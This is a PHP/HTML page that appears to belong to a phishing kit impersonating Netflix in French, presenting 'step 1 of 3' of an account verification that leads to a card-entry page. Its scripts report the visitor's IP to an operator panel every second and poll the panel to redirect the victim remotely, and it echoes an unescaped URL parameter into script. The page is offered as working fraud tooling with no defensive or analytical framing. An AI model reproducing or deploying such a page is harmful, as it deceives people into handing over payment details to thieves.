<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérifiez les informations de votre compte</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: white;
            color: #000;
            margin: 0;
            padding: 20px;
        }
        .main {
            max-width: 500px;
            margin: 40px auto;
            text-align: center;
        }
        .devices {
            margin: 40px 0 30px;
        }
        .devices img {
            max-width: 100%;
            height: auto;
        }
        .step {
            font-size: 1.05em;
            color: #666;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 1.8em;
            font-weight: bold;
            margin: 15px 0 25px;
        }
        p {
            font-size: 1.08em;
            line-height: 1.5;
            color: #333;
        }
        .btn-red {
            background-color: #e50914;
            color: white;
            border: none;
            padding: 16px 0;
            font-size: 1.1em;
            font-weight: 600;
            border-radius: 4px;
            margin-top: 40px;
            width: 100%;
            max-width: 380px;
        }
    </style>
</head>
<body>

<div class="main">

    <!-- Your PNG with the devices -->
    <div class="devices">
        <img src="res/img/p.png" alt="Devices">
    </div>

    <div class="step">ÉTAPE 1 SUR 3</div>
    
    <h1>Vérifiez les informations de votre compte.</h1>
    
    <p>Netflix garantit votre sécurité, pour cela il est nécessaire de vérifier vos informations.</p>

    <button onclick="window.location.href='card.php'" class="btn-red">Suivant</button>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP ?? $_SERVER['REMOTE_ADDR'] ?? "unknown"; ?>'});
}, 1000);

var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd != d && d != 0){
            window.location = d;
        }
    });
}, 2000);
</script>
</body>
</html>